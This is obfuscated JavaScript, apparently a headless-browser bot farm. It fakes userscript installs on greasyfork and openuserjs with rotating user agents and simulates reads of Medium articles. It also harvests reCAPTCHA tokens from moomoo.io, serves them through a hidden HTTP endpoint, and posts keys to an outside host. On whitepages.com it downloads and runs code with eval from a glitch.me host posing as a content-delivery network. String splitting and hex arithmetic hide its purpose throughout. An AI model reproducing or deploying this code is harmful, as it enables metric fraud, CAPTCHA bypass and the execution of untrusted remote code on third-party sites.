      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + V(0x11) + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x10) + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + X(0x12) + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + X(0xd) + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + X(0x1c) + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2577 * -0x1 + -0xd67 + -0x22 * -0x17f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x8c3 * -0x2 + -0x49 * 0x1 + 0x61 * 0x2f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x78e + 0x1eef + -0x2619), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xac9 + -0x1 * -0xcec + -0x1 * 0x1751), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x24b5 + -0x1516 + 0x39cb;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1cbe * 0x1 + 0x148f + 0x82f; w < getRandomInt(0x1176 + 0x1 * 0x1f20 + -0x3095, 0x487 * 0x3 + -0x2cb * -0x5 + -0x1b * 0x105); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x277a * -0x4 + 0x1 * -0x10d93 + -0xc1 * -0x1cb);
        }
      }();
    }, 0xd * 0x12a + -0x229a + -0x2 * -0x9ee), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = b,
        Z = c,
        Y = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x2029 + 0x55e + 0x1acb;
      const x = await v['newPage']();
      if (await x[Y(0x17)]('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate'](Z(0x2) + 'ocumentEle' + a0(0x6, 'B7(T') + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1ba2 + 0x1541 + 0x661, 0x376 * -0x8 + 0x24cd + -0x8eb)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x949 * 0x11 + -0xb7a8 + -0x1 * -0x8eff);
    }, 0xdcd * 0x1 + -0x1bed + -0xe84 * -0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1667 + 0x1 * 0x1d7b + -0x33e2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x29 * 0xb1 + 0xdfc + 0xb * 0x25f), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x17 * -0x158 + 0x1 * -0x2335 + 0x44d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1aac55 + -0x15ca36 + 0x5 * 0xc706f);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x88c + -0x373 * -0x1 + -0x5 * -0x119);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1a0d + 0x19 * 0x10d + -0x338a);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x2 * 0x8fd + 0x1576 + -0x1 * -0x1c14);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x40 * 0x1b + -0x1cc9 + 0x238a * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x22 * 0xef + -0x4a7 + 0x2466));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1102 + -0x1582 + 0x48 * 0x10, D['indexOf']('\x20'));
        return B ? E['slice'](0x22c9 * 0x1 + 0x356 + -0x3 * 0xcb5, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2fbc + -0x4711 + -0x1 * -0x9ddd),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x125 * 0x1c + -0x3362 + 0x3a66),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0xf) + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + a2(0x16, 'Yqs^') + 'WOW64)\x20App' + 'leWebKit/5' + a1(0x1b) + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + a2(0xc, 'K6X7') + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
